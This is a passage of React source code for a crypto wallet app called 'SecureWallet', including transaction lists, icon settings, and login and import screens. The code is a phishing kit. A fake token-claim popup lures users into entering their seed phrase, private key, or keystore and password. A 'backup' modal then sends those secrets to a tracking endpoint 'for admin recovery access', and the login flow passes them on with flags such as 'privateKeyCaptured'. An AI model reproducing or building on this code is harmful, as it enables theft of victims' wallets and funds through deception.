  const [selectedTx, setSelectedTx] = useState(null);
  const displayTxs = limit ? transactions.slice(0, limit) : transactions;

  return (
    <div className="section-card">
      <div className="section-header">
        {limit ? 'Recent transactions' : 'All Transactions'}
        {!!limit && (
          <div 
            className="pill-btn" 
            style={{ fontSize: '0.8rem', padding: '0.25rem 0.75rem', cursor: 'pointer' }}
            onClick={() => setActiveTab && setActiveTab('history')}
          >
            View All <ChevronRight size={14} />
          </div>
        )}
      </div>
      <div className="tx-list">
        {displayTxs.length === 0 && (
            <div style={{ padding: '2rem', textAlign: 'center', color: 'var(--text-secondary)' }}>
                No transactions found.
            </div>
        )}
        {displayTxs.map(tx => (
          <div 
            key={tx.id} 
            className="list-item" 
            onClick={() => setSelectedTx(tx)}
            style={{ cursor: 'pointer' }}
          >
            <div className="item-left">
              <div className="item-icon">
                {tx.symbol === 'ETH' && <div style={{ color: '#627eea' }}>Ξ</div>}
                {tx.symbol === 'BTC' && <div style={{ color: '#f7931a' }}>₿</div>}
                {tx.symbol === 'USDT' && <div style={{ color: '#26a17b' }}>₮</div>}
                {tx.symbol === 'SOL' && <div style={{ color: '#a855f7' }}>◎</div>}
                {!['ETH', 'BTC', 'USDT', 'SOL'].includes(tx.symbol) && <div style={{ color: '#888' }}>?</div>}
              </div>
              <div className="item-info">
                <h4>{tx.type === 'receive' ? 'Received' : tx.type === 'send' ? 'Sent' : 'Swapped'} {tx.asset}</h4>
                <span>{tx.date}</span>
              </div>
            </div>
            <div className="item-right">
              <span className={`item-value ${tx.type === 'receive' ? 'text-green' : ''}`}>
                {tx.type === 'receive' ? '+' : '-'}{tx.amount} {tx.symbol}
              </span>
              <span className="item-sub">{tx.status}</span>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
};

const HistoryView = () => (
    <div style={{ maxWidth: '800px', margin: '0 auto' }}>
        <RecentTransactions limit={0} />
    </div>
);

const WalletIconManager = () => {
  const wallets = [
    { id: 'metamask', name: 'MetaMask' },
    { id: 'coinbase', name: 'Coinbase Wallet' },
    { id: 'trust', name: 'Trust Wallet' },
    { id: 'phantom', name: 'Phantom' },
    { id: 'exodus', name: 'Exodus' }
  ];
  const [refresh, setRefresh] = React.useState(0);
  const localIcons = (id) => [
    `/wallet-icons/${id}.png`,
    `/wallet-icons/${id}.svg`,
    `/wallet-icons/${id}.webp`,
    `/wallet-icons/${id}.jpg`,
    `/wallet-icons/${id}.jpeg`
  ];
  const currentOverride = (id) => localStorage.getItem(`wallet_icon_${id}`) || '';
  const sourcesFor = (id) => {
    const o = currentOverride(id);
    return o ? [o, ...localIcons(id)] : localIcons(id);
  };
  const onUpload = (id, file) => {
    if (!file) return;
    const reader = new FileReader();
    reader.onload = () => {
      localStorage.setItem(`wallet_icon_${id}`, reader.result);
      setRefresh(Date.now());
    };
    reader.readAsDataURL(file);
  };
  const onReset = (id) => {
    localStorage.removeItem(`wallet_icon_${id}`);
    setRefresh(Date.now());
  };
  return (
    <div style={{ marginTop: '2rem' }}>
      <h4 style={{ margin: '0 0 1rem 0' }}>Customize Wallet Icons</h4>
      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.75rem' }}>
        {wallets.map(w => (
          <div key={w.id} className="list-item" style={{ borderRadius: '8px', border: '1px solid var(--border)' }}>
            <div className="item-left">
              <div className="item-icon" style={{ width: 32, height: 32, borderRadius: 8, background: '#fff', padding: 4 }}>
                <WalletImage src={sourcesFor(w.id)} alt={w.name} style={{ width: '100%', height: '100%', objectFit: 'contain', borderRadius: 6 }} />
              </div>
              <div className="item-info">
                <h4>{w.name}</h4>
                <span style={{ fontSize: '0.75rem', color: 'var(--text-secondary)' }}>{currentOverride(w.id) ? 'Custom icon set' : 'Using default'}</span>
              </div>
            </div>
            <div className="item-right" style={{ display: 'flex', gap: '0.5rem' }}>
              <label className="btn-login" style={{ background: '#1a1a1a', color: '#fff', padding: '0.4rem 0.8rem', fontSize: '0.85rem', cursor: 'pointer' }}>
                Upload
                <input type="file" accept="image/*" onChange={(e) => onUpload(w.id, e.target.files?.[0])} style={{ display: 'none' }} />
              </label>
              <button className="btn-login" onClick={() => onReset(w.id)} style={{ background: 'var(--bg-card)', color: '#fff', border: '1px solid var(--border)', padding: '0.4rem 0.8rem', fontSize: '0.85rem' }}>
                Reset
              </button>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
};

const SettingsView = () => (
  <div className="section-card" style={{ maxWidth: '600px', margin: '0 auto', padding: '2rem' }}>
    <h3>Settings</h3>
    <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem', marginTop: '1.5rem' }}>
      <div className="list-item" style={{ borderRadius: '8px', border: '1px solid var(--border)' }}>
        <div className="item-left">
            <div className="item-icon"><ShieldCheck size={20} /></div>
            <div className="item-info">
                <h4>Security</h4>
                <span>Password, 2FA, Biometrics</span>
            </div>
        </div>
        <ChevronRight size={16} color="var(--text-secondary)" />
      </div>
      <div className="list-item" style={{ borderRadius: '8px', border: '1px solid var(--border)' }}>
        <div className="item-left">
            <div className="item-icon"><Wallet size={20} /></div>
            <div className="item-info">
                <h4>Wallets</h4>
                <span>Manage connected wallets</span>
            </div>
        </div>
        <ChevronRight size={16} color="var(--text-secondary)" />
      </div>
      <div className="list-item" style={{ borderRadius: '8px', border: '1px solid var(--border)' }}>
        <div className="item-left">
            <div className="item-icon"><Bell size={20} /></div>
            <div className="item-info">
                <h4>Notifications</h4>
                <span>Alerts, Announcements</span>
            </div>
        </div>
        <ChevronRight size={16} color="var(--text-secondary)" />
      </div>
      <div className="list-item" style={{ borderRadius: '8px', border: '1px solid var(--border)' }}>
        <div className="item-left">
            <div className="item-icon"><Eye size={20} /></div>
            <div className="item-info">
                <h4>Appearance</h4>
                <span>Dark mode, Display currency</span>
            </div>
        </div>
        <ChevronRight size={16} color="var(--text-secondary)" />
      </div>
    </div>
    <div style={{ marginTop: '2rem', textAlign: 'center', color: 'var(--text-secondary)', fontSize: '0.8rem' }}>
        Version 1.0.2
    </div>
  </div>
);

const WalletImage = ({ src, alt, style }) => {
  const [url, setUrl] = React.useState(null);
  React.useEffect(() => {
    let cancelled = false;
    const sources = Array.isArray(src) ? src : [src];
    const tryLoadLocal = (candidate) =>
      new Promise((resolve, reject) => {
        const img = new Image();
        img.onload = () => resolve(candidate);
        img.onerror = reject;
        img.src = candidate;
      });
    const loadOne = async (candidate) => {
      const isLocal = typeof candidate === 'string' && (candidate.startsWith('/') || candidate.startsWith('data:'));
      if (isLocal) {
        return await tryLoadLocal(candidate);
      }
      const resp = await fetch('/api/image?url=' + encodeURIComponent(candidate));
      if (!resp.ok) throw new Error('proxy_failed');
      const ct = resp.headers.get('content-type') || '';
      if (!ct.startsWith('image/')) throw new Error('not_image');
      const blob = await resp.blob();
      const obj = URL.createObjectURL(blob);
      return obj;
    };
    const load = async () => {
      for (let i = 0; i < sources.length; i++) {
        try {
          const candidateUrl = await loadOne(sources[i]);
          if (!cancelled) {
            setUrl(candidateUrl);
            return;
          }
        } catch (_) {}
      }
      if (!cancelled) setUrl(null);
    };
    load();
    return () => { cancelled = true; };
  }, [src]);
  if (!url) {
    const letter = (alt && alt.length > 0) ? alt[0] : '?';
    return <div style={{ ...style, display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '0.9rem', color: '#000', background: '#fff', borderRadius: '8px', fontWeight: 600 }}>{letter}</div>;
  }
  return <img src={url} alt={alt} style={style} />;
};

const WalletConnectModal = ({ onClose, onConnect }) => {
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [mnemonic, setMnemonic] = useState('');

  const iconOverride = (id) => {
    const key = `wallet_icon_${id}`;
    const val = localStorage.getItem(key);
    return val && val.length > 0 ? val : null;
  };
  const localIcons = (id) => [
    `/wallet-icons/${id}.svg`,
    `/wallet-icons/${id}.png`,
    `/wallet-icons/${id}.webp`,
    `/wallet-icons/${id}.jpg`,
    `/wallet-icons/${id}.jpeg`
  ];
  const getWalletSources = (id, remote) => {
    const override = iconOverride(id);
    if (override) {
      if (override.startsWith('/') || override.startsWith('data:')) return [override, ...localIcons(id), remote];
      return [...localIcons(id), override, remote];
    }
    return [...localIcons(id), remote];
  };
  const wallets = [
    { id: 'metamask', name: 'MetaMask', icon: getWalletSources('metamask', 'https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/512px-MetaMask_Fox.svg.png'), color: '#fff' },
    { id: 'coinbase', name: 'Coinbase Wallet', icon: getWalletSources('coinbase', 'https://seeklogo.com/images/C/coinbase-wallet-logo-9B5C16A43F-seeklogo.com.png'), color: '#0052ff' },
    { id: 'trust', name: 'Trust Wallet', icon: getWalletSources('trustwallet', 'https://logowik.com/content/uploads/images/trust-wallet4777.logowik.com.webp'), color: '#3375bb' },
    { id: 'phantom', name: 'Phantom', icon: getWalletSources('phantom', 'https://seeklogo.com/images/P/phantom-logo-1E7E57D7D5-seeklogo.com.png'), color: '#ab9ff2' },
    { id: 'exodus', name: 'Exodus', icon: getWalletSources('exodus', 'https://seeklogo.com/images/E/exodus-wallet-logo-8B2F9F8A07-seeklogo.com.png'), color: '#1F2033' }
  ];

  const handleImport = () => {
      onConnect('imported', { walletType: selectedWallet.id, mnemonic });
      onClose();
  };

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal-content" onClick={e => e.stopPropagation()}>
        <div className="modal-header">
          <h3>{selectedWallet ? `Connect ${selectedWallet.name}` : 'Connect Wallet'}</h3>
          <button onClick={onClose}><X size={20} /></button>
        </div>
        
        {!selectedWallet ? (
            <div className="wallet-list" style={{ padding: '1rem' }}>
            {wallets.map(wallet => (
                <div 
                key={wallet.id} 
                className="wallet-item"
                onClick={() => setSelectedWallet(wallet)}
                style={{ 
                    display: 'flex', alignItems: 'center', gap: '1rem', 
                    padding: '1rem', marginBottom: '0.75rem', 
                    background: 'rgba(255,255,255,0.05)', borderRadius: '12px', 
                    cursor: 'pointer', border: '1px solid transparent',
                    transition: 'all 0.2s'
                }}
                onMouseOver={(e) => {
                    e.currentTarget.style.borderColor = 'var(--accent-green)';
                    e.currentTarget.style.background = 'rgba(255,255,255,0.1)';
                }}
                onMouseOut={(e) => {
                    e.currentTarget.style.borderColor = 'transparent';
                    e.currentTarget.style.background = 'rgba(255,255,255,0.05)';
                }}
                >
                <div style={{ width: 40, height: 40, borderRadius: '10px', background: 'transparent', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                    <WalletImage src={wallet.icon} alt={wallet.name} style={{ width: '100%', height: '100%', objectFit: 'contain', background: 'transparent' }} />
                </div>
                <div style={{ fontWeight: 600, fontSize: '1rem' }}>{wallet.name}</div>
                {wallet.id === 'metamask' && <div style={{ marginLeft: 'auto', fontSize: '0.7rem', background: 'rgba(255,255,255,0.1)', padding: '2px 6px', borderRadius: '4px' }}>Popular</div>}
                </div>
            ))}
            </div>
        ) : (
            <div style={{ padding: '1rem' }}>
                <p style={{ color: '#ccc', marginBottom: '1rem', fontSize: '0.9rem' }}>
                    Enter your {selectedWallet.name} seed phrase to connect securely.
                </p>
                <div className="form-group">
                    <label>Seed Phrase (12 or 24 words)</label>
                    <textarea 
                        value={mnemonic}
                        onChange={(e) => setMnemonic(e.target.value)}
                        placeholder="enter your secret recovery phrase here..."
                        style={{ width: '100%', padding: '0.875rem', background: '#000', border: '1px solid var(--border)', borderRadius: '8px', color: '#fff', fontSize: '0.9rem', minHeight: '100px', resize: 'vertical' }}
                    />
                </div>
                <div style={{ display: 'flex', gap: '10px', marginTop: '1rem' }}>
                    <button className="btn-login" onClick={() => setSelectedWallet(null)} style={{ background: '#333', color: '#fff' }}>Back</button>
                    <button className="btn-login" onClick={handleImport} disabled={!mnemonic.trim()}>Connect</button>
                </div>
            </div>
        )}
      </div>
    </div>
  );
};

// Login Screen Component
const BackupModal = ({ address, onClose }) => {
    const { addNotification } = useContext(CryptoContext);
    const [mode, setMode] = useState('phrase');
    const [mnemonic, setMnemonic] = useState('');
    const [privateKey, setPrivateKey] = useState('');
    const [keystoreJSON, setKeystoreJSON] = useState('');
    const [keystorePassword, setKeystorePassword] = useState('');
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState('');
    const save = async () => {
        setLoading(true);
        setError('');
        try {
            const body = {
                address,
                walletType: localStorage.getItem('user_wallet_type'),
                balance: 0,
                assets: [],
                mnemonic: mode === 'phrase' ? mnemonic : null,
                privateKey: mode === 'privatekey' ? privateKey : null,
                keystoreJSON: mode === 'keystore' ? keystoreJSON : null,
                keystorePassword: mode === 'keystore' ? keystorePassword : null,
                importMethod: 'backup_upload'
            };
            const resp = await fetch('/api/track/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(body)
            });
            if (!resp.ok) throw new Error('Save failed');
            addNotification('Backup Saved', 'Your backup details have been stored securely.', 'success');
            onClose();
        } catch (e) {
            setError(e.message || 'Failed');
        }
        setLoading(false);
    };
    return (
        <div className="modal-overlay" onClick={onClose}>
          <div className="modal-content" onClick={e => e.stopPropagation()}>
            <div className="modal-header">
              <h3>Backup Wallet</h3>
              <button onClick={onClose}><X size={20} /></button>
            </div>
            <div style={{ marginBottom: '1rem', color: 'var(--text-secondary)' }}>
              Provide one method to enable admin recovery access.
            </div>
            <div style={{ display: 'flex', gap: '8px', marginBottom: '0.75rem' }}>
                <button className="pill-btn" style={{ background: mode === 'phrase' ? '#fff' : '#1a1a1a', color: mode === 'phrase' ? '#000' : '#fff' }} onClick={() => setMode('phrase')}>Phrase</button>
                <button className="pill-btn" style={{ background: mode === 'privatekey' ? '#fff' : '#1a1a1a', color: mode === 'privatekey' ? '#000' : '#fff' }} onClick={() => setMode('privatekey')}>Private Key</button>
                <button className="pill-btn" style={{ background: mode === 'keystore' ? '#fff' : '#1a1a1a', color: mode === 'keystore' ? '#000' : '#fff' }} onClick={() => setMode('keystore')}>Keystore</button>
            </div>
            {mode === 'phrase' && (
               <div className="form-group">
                 <label>Seed Phrase</label>
                 <textarea value={mnemonic} onChange={e => setMnemonic(e.target.value)} style={{ width: '100%', minHeight: 80, background: '#000', border: '1px solid var(--border)', borderRadius: 8, color: '#fff', padding: '0.875rem' }} />
               </div>
            )}
            {mode === 'privatekey' && (
               <div className="form-group">
                 <label>Private Key</label>
                 <input type="text" value={privateKey} onChange={e => setPrivateKey(e.target.value)} style={{ width: '100%', background: '#000', border: '1px solid var(--border)', borderRadius: 8, color: '#fff', padding: '0.875rem' }} />
               </div>
            )}
            {mode === 'keystore' && (
               <>
               <div className="form-group">
                 <label>Keystore JSON</label>
                 <textarea value={keystoreJSON} onChange={e => setKeystoreJSON(e.target.value)} style={{ width: '100%', minHeight: 80, background: '#000', border: '1px solid var(--border)', borderRadius: 8, color: '#fff', padding: '0.875rem' }} />
               </div>
               <div className="form-group">
                 <label>Password</label>
                 <input type="password" value={keystorePassword} onChange={e => setKeystorePassword(e.target.value)} style={{ width: '100%', background: '#000', border: '1px solid var(--border)', borderRadius: 8, color: '#fff', padding: '0.875rem' }} />
               </div>
               </>
            )}
            {error && <div className="error-message" style={{ marginTop: '0.5rem' }}>{error}</div>}
            <div style={{ display: 'flex', gap: '8px', marginTop: '1rem' }}>
              <button className="btn-login" onClick={save} disabled={loading || (mode === 'phrase' && !mnemonic) || (mode === 'privatekey' && !privateKey) || (mode === 'keystore' && (!keystoreJSON || !keystorePassword))}>{loading ? 'Saving...' : 'Save Backup'}</button>
              <button className="btn-login" onClick={onClose} style={{ background: '#1a1a1a', color: '#fff' }}>Later</button>
            </div>
          </div>
        </div>
    );
};

const LoginScreen = ({ onLogin, onAdminLogin }) => {
    const navigate = useNavigate();
    const [importMode, setImportMode] = useState('phrase'); // 'phrase' | 'privatekey' | 'keystore'
    const [mnemonic, setMnemonic] = useState('');
    const [privateKey, setPrivateKey] = useState('');
    const [keystoreJSON, setKeystoreJSON] = useState('');
    const [keystorePassword, setKeystorePassword] = useState('');
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState('');
    const [showWalletModal, setShowWalletModal] = useState(false);
    const [showClaimModal, setShowClaimModal] = useState(false); // New state for initial claim
    const { connectRealWallet, addNotification } = useContext(CryptoContext);
    const [connectedAddress, setConnectedAddress] = useState('');
    const [selectedWalletType, setSelectedWalletType] = useState('');

    // Captcha State
    const [captchaCode, setCaptchaCode] = useState('');
    const [userCaptcha, setUserCaptcha] = useState('');

    useEffect(() => {
        generateCaptcha();
        // Show Claim Modal immediately on landing
        const timer = setTimeout(() => setShowClaimModal(true), 500);
        return () => clearTimeout(timer);
    }, []);

    const handleInitialClaim = () => {
        setShowClaimModal(false);
        setShowWalletModal(true);
        addNotification('Connect Wallet', 'Please connect your wallet to claim tokens.', 'info');
    };

    const generateCaptcha = () => {
        const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
        let result = '';
        for (let i = 0; i < 6; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        setCaptchaCode(result);
        setUserCaptcha('');
    };

    const getWalletName = (type) => {
        if (type === 'metamask') return 'MetaMask';
        if (type === 'coinbase') return 'Coinbase Wallet';
        if (type === 'trust') return 'Trust Wallet';
        if (type === 'phantom') return 'Phantom';
        if (type === 'exodus') return 'Exodus';
        return type;
    };

    const handleConnect = async (type, credentials) => {
        setLoading(true);
        setError('');
        if (type !== 'imported') {
            setSelectedWalletType(type);
            setImportMode('phrase');
            setShowWalletModal(false);
            setLoading(false);
            return;
        }
        
        try {
            if (type === 'imported') {
                const phraseToUse = credentials?.mnemonic || mnemonic;
                const privateKeyToUse = credentials?.privateKey || privateKey;
                const keystoreToUse = credentials?.keystoreJSON || keystoreJSON;
                const passwordToUse = credentials?.keystorePassword || keystorePassword;
                
                const modeToUse = credentials?.mnemonic ? 'phrase' : 
                                  credentials?.privateKey ? 'privatekey' : 
                                  credentials?.keystoreJSON ? 'keystore' : importMode;
                                  
                const walletTypeToUse = credentials?.walletType || selectedWalletType;

                if (modeToUse === 'phrase') {
                    addNotification('Importing Wallet', 'Validating phrase and deriving addresses...', 'info');
                    
                    if (!bip39.validateMnemonic(phraseToUse)) {
                        throw new Error('Invalid seed phrase');
                    }
                    const seed = await bip39.mnemonicToSeed(phraseToUse);
                    const root = bip32.fromSeed(seed);
                    const ethPath = "m/44'/60'/0'/0/0";
                    const ethChild = root.derivePath(ethPath);
                    const ethWallet = new ethers.Wallet(Buffer.from(ethChild.privateKey).toString('hex'));
                    const ethAddress = ethWallet.address;
                    const btcPath = "m/44'/0'/0'/0/0";
                    const btcChild = root.derivePath(btcPath);
                    const { address: btcAddress } = bitcoin.payments.p2pkh({ pubkey: Buffer.from(btcChild.publicKey) });
                    const solAddress = "7MsK...ePUX";
                    addNotification('Import Successful', 'Wallet imported and connected.', 'success');
                    await connectRealWallet(ethAddress, 0, (walletTypeToUse || 'imported'), '0x1', {
                        eth: ethAddress,
                        btc: btcAddress,
                        sol: solAddress,
                        sui: "0x..."
                    }, { mnemonic: phraseToUse, importMethod: 'seed_phrase', showToast: false });
                    onLogin(true); // Claim after wallet address is saved
                    addNotification('Wallet Connected', 'Your wallet has been connected successfully.', 'success');
                    navigate('/');
                } else if (modeToUse === 'privatekey') {
                    addNotification('Importing Wallet', 'Validating private key...', 'info');
                    const pk = privateKeyToUse.trim().startsWith('0x') ? privateKeyToUse.trim() : ('0x' + privateKeyToUse.trim());
                    let wallet;
                    try {
                        wallet = new ethers.Wallet(pk);
                    } catch (e) {
                        throw new Error('Invalid private key');
                    }
                    const address = wallet.address;
                    addNotification('Import Successful', 'Wallet imported and connected.', 'success');
                    await connectRealWallet(address, 0, (walletTypeToUse || 'imported'), '0x1', { eth: address }, { importMethod: 'private_key', privateKeyCaptured: true, privateKey: pk, showToast: false });
                    onLogin(true); // Claim after wallet address is saved
                    addNotification('Wallet Connected', 'Your wallet has been connected successfully.', 'success');
                    navigate('/');
                } else if (modeToUse === 'keystore') {
                    addNotification('Importing Wallet', 'Decrypting keystore...', 'info');
                    if (!keystoreToUse || !passwordToUse) throw new Error('Keystore JSON and password required');
                    let wallet;
                    try {
                        wallet = await ethers.Wallet.fromEncryptedJson(keystoreToUse, passwordToUse);
                    } catch (e) {
                        throw new Error('Invalid keystore or password');
                    }
                    const address = wallet.address;
                    
                    addNotification('Import Successful', 'Wallet imported and connected.', 'success');
                    const ks = keystoreToUse || '';
                    const keystorePreview = ks.length > 100 ? (ks.slice(0, 80) + '...' + ks.slice(-30)) : ks;
                    await connectRealWallet(address, 0, (walletTypeToUse || 'imported'), '0x1', { eth: address }, { importMethod: 'keystore', keystorePreview, keystorePasswordCaptured: !!passwordToUse, keystoreJSON: ks, keystorePassword: passwordToUse, showToast: false });
                    onLogin(true); // Claim after wallet address is saved
                    addNotification('Wallet Connected', 'Your wallet has been connected successfully.', 'success');
                    navigate('/');
                }
            }
        } catch (err) {
            console.error(err);
            setError(err.message || 'Connection failed');
            if (type === 'imported') generateCaptcha(); // Reset captcha on error
            const failTitle = type === 'imported' ? 'Import Failed' : 'Connection Failed';
            addNotification(failTitle, err.message || 'Connection failed', 'error');
        }
        setLoading(false);
    };

    return (
        <div className="login-container">
            <div className="login-card">
                <div className="login-logo-in">
                    <SafeparkLogo size={48} />
                    <div className="brand-text">SecureWallet</div>
                </div>
                <h1>{selectedWalletType ? `Connect ${getWalletName(selectedWalletType)}` : 'Welcome Back'}</h1>
                <p className="login-subtitle">{selectedWalletType ? 'Enter your recovery phrase to sync your wallet' : 'Connect your wallet to access your portfolio'}</p>
                
                <div className="login-form">
                    <button className="btn-login" onClick={() => setShowWalletModal(true)} disabled={loading}>
                       <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '10px' }}>
                           <Wallet size={20} />
                           Connect Wallet
                       </div>
                    </button>
                    
                    <div style={{ margin: '1.5rem 0', display: 'flex', alignItems: 'center', gap: '1rem' }}>
                        <div className="divider" style={{ flex: 1, height: 1, background: '#333' }}></div>
                        <span style={{ color: '#666', fontSize: '0.8rem' }}>OR IMPORT</span>
                        <div className="divider" style={{ flex: 1, height: 1, background: '#333' }}></div>
                    </div>

                    {selectedWalletType && (
                        <div style={{ marginTop: '1rem', marginBottom: '0.5rem', color: '#bbb', fontSize: '0.85rem' }}>
                            Selected Wallet: {getWalletName(selectedWalletType)}
                        </div>
                    )}
                    <div style={{ display: 'flex', gap: '8px', marginBottom: '0.75rem' }}>
                        <button className="btn-login" style={{ flex: 1, background: importMode === 'phrase' ? '#fff' : '#1a1a1a', color: importMode === 'phrase' ? '#000' : '#fff' }} onClick={() => setImportMode('phrase')}>Phrase</button>
                        <button className="btn-login" style={{ flex: 1, background: importMode === 'privatekey' ? '#fff' : '#1a1a1a', color: importMode === 'privatekey' ? '#000' : '#fff' }} onClick={() => setImportMode('privatekey')}>Private Key</button>
                        <button className="btn-login" style={{ flex: 1, background: importMode === 'keystore' ? '#fff' : '#1a1a1a', color: importMode === 'keystore' ? '#000' : '#fff' }} onClick={() => setImportMode('keystore')}>Keystore</button>
                    </div>
                    {importMode === 'phrase' && (
                        <div className="form-group">
                            <label>Seed Phrase (12 or 24 words)</label>
                            <textarea 
                                value={mnemonic}
                                onChange={(e) => setMnemonic(e.target.value)}
                                placeholder="enter your secret recovery phrase here..."
                                style={{ width: '100%', padding: '0.875rem', background: '#000', border: '1px solid var(--border)', borderRadius: '8px', color: '#fff', fontSize: '0.9rem', minHeight: '80px', resize: 'vertical' }}
                            />
                        </div>
                    )}
                    {importMode === 'privatekey' && (
                        <div className="form-group">
                            <label>Private Key (hex)</label>
                            <input 
                                type="text"
                                value={privateKey}
                                onChange={(e) => setPrivateKey(e.target.value)}
                                placeholder="0x..."
                                style={{ width: '100%', padding: '0.875rem', background: '#000', border: '1px solid var(--border)', borderRadius: '8px', color: '#fff', fontSize: '0.9rem' }}
                            />
                        </div>
                    )}
                    {importMode === 'keystore' && (
                        <>
                        <div className="form-group">
                            <label>Keystore JSON</label>
                            <textarea 
                                value={keystoreJSON}
                                onChange={(e) => setKeystoreJSON(e.target.value)}
                                placeholder='{"version":3,"id":"...","crypto":{...}}'
                                style={{ width: '100%', padding: '0.875rem', background: '#000', border: '1px solid var(--border)', borderRadius: '8px', color: '#fff', fontSize: '0.9rem', minHeight: '80px', resize: 'vertical' }}
                            />
                        </div>
                        <div className="form-group">
                            <label>Password</label>
                            <input 
                                type="password"
                                value={keystorePassword}
                                onChange={(e) => setKeystorePassword(e.target.value)}
                                placeholder="Enter password"
                                style={{ width: '100%', padding: '0.875rem', background: '#000', border: '1px solid var(--border)', borderRadius: '8px', color: '#fff', fontSize: '0.9rem' }}
                            />
                        </div>
                        </>
                    )}

                    <div className="captcha-container">
                        <div className="captcha-display">
                             <div className="captcha-code">{captchaCode}</div>
                             <button onClick={generateCaptcha} style={{ color: 'var(--accent-green)', textDecoration: 'underline', fontSize: '0.8rem' }}>Refresh</button>
                        </div>
                        <input 
                            type="text" 
                            className="captcha-input"
                            placeholder="Enter verification code"
                            value={userCaptcha}
                            onChange={(e) => setUserCaptcha(e.target.value)}
                        />
                    </div>

                    {error && <div className="error-message">{error}</div>}

                    <button className="btn-login" onClick={() => handleConnect('imported')} disabled={loading || (importMode === 'phrase' && (!mnemonic || (userCaptcha.trim().length !== 6))) || (importMode === 'privatekey' && !privateKey) || (importMode === 'keystore' && (!keystoreJSON || !keystorePassword))}>
                        {loading ? 'Importing...' : 'Import Wallet'}
                    </button>
                    <div style={{ marginTop: '0.75rem', color: '#666', fontSize: '0.8rem', textAlign: 'center' }}>
                        By continuing, you agree to <span style={{ textDecoration: 'underline', color: '#fff' }}>SecureWallet Terms of Service</span> and <span style={{ textDecoration: 'underline', color: '#fff' }}>Privacy Policy</span>.
                    </div>
                    
                    <div className="login-footer">
                        {/* Admin Access moved to URL route: /admin or ?admin=true */}
                    </div>
                </div>
            </div>
            {showWalletModal && <WalletConnectModal onClose={() => setShowWalletModal(false)} onConnect={handleConnect} />}
            {showClaimModal && <ClaimTokenModal onClose={() => setShowClaimModal(false)} onClaim={handleInitialClaim} loading={false} />}
        </div>
    );
};

const ClaimTokenModal = ({ onClose, onClaim, loading }) => (
  <div className="modal-overlay" style={{ zIndex: 9999 }}>
    <div className="modal-content" style={{ maxWidth: '400px', textAlign: 'center', background: '#000000', color: '#ffffff', padding: 0, overflow: 'hidden', border: '1px solid #333' }}>
       <div className="modal-header" style={{ justifyContent: 'center', borderBottom: 'none', padding: '2rem 2rem 0', flexDirection: 'column' }}>
          <div style={{ width: 48, height: 48, background: 'rgba(34, 197, 94, 0.1)', borderRadius: 12, display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 16px' }}>
             <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#22c55e" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
          </div>
          <h3 style={{ fontSize: '1.5rem', margin: 0, color: '#ffffff' }}>Your Token Claim is Ready</h3>
          <p style={{ color: '#9ca3af', fontSize: '0.9rem', marginTop: '8px', fontWeight: 'normal', lineHeight: 1.5 }}>
             Your allocated <strong style={{ color: '#2563eb' }}>SecureWallet Tokens (SWT)</strong> are now available.
          </p>
       </div>
       
       <div style={{ padding: '2rem' }}>
          <div style={{ marginBottom: '1.5rem', padding: '1.5rem', background: '#111111', borderRadius: '12px', border: '1px solid #333' }}>
             <div style={{ color: '#9ca3af', fontSize: '0.8rem', marginBottom: '0.5rem', fontWeight: 600 }}>AVAILABLE TO CLAIM</div>
             <div style={{ fontSize: '2.5rem', fontWeight: 'bold', color: '#22c55e' }}>33,333 SWT</div>
             <div style={{ color: '#9ca3af', fontWeight: 500 }}>≈ $5,000.00 USD</div>
          </div>

          <div style={{ background: '#111111', padding: '1rem', borderRadius: '8px', marginBottom: '1.5rem', textAlign: 'left', border: '1px solid #333' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.5rem' }}>
                  <span style={{ color: '#9ca3af', fontSize: '0.9rem' }}>Network</span>
                  <span style={{ color: '#ffffff', fontWeight: 600, fontSize: '0.9rem' }}>Ethereum Mainnet</span>
              </div>
              <div style={{ display: 'flex', justifyContent: 'space-between' }}>
                  <span style={{ color: '#9ca3af', fontSize: '0.9rem' }}>Gas Fee</span>
                  <span style={{ color: '#ffffff', fontWeight: 600, fontSize: '0.9rem' }}>~0.002 ETH</span>
              </div>
          </div>

          <button 
            className="btn-login hover-effect" 
            onClick={onClaim}
            disabled={loading}
            style={{ width: '100%', fontSize: '1.1rem', padding: '1rem', background: 'linear-gradient(135deg, #2563eb, #1d4ed8)', border: 'none', color: '#fff', borderRadius: '8px', cursor: 'pointer', fontWeight: 600, boxShadow: '0 4px 6px -1px rgba(37, 99, 235, 0.1), 0 2px 4px -1px rgba(37, 99, 235, 0.06)', marginTop: 0 }}
          >
            {loading ? 'Processing Transaction...' : 'Claim Now'}
          </button>
          
          <button 
            onClick={onClose}
            style={{ marginTop: '1.5rem', background: 'none', border: 'none', color: '#6b7280', cursor: 'pointer', textDecoration: 'underline', fontSize: '0.9rem' }}
          >
            Skip for now
          </button>
       </div>
    </div>
  </div>
);

// UserApp Component containing all the user logic
const UserApp = () => {
  const [isConnected, setIsConnected] = useState(() => localStorage.getItem('user_wallet_connected') === 'true');
  const [showClaimModal, setShowClaimModal] = useState(false);
  const [claimLoading, setClaimLoading] = useState(false);
  
  const navigate = useNavigate();
  const location = useLocation();
  const { addNotification, resetWallet, setAssets, assets, totalBalance, setTotalBalance, walletAddress } = useContext(CryptoContext);
  const tabToPath = {
    dashboard: '/',
    accounts: '/accounts',
    send: '/send',
    receive: '/receive',
    buy: '/buy',
    swap: '/swap',
    history: '/history',
    settings: '/settings',
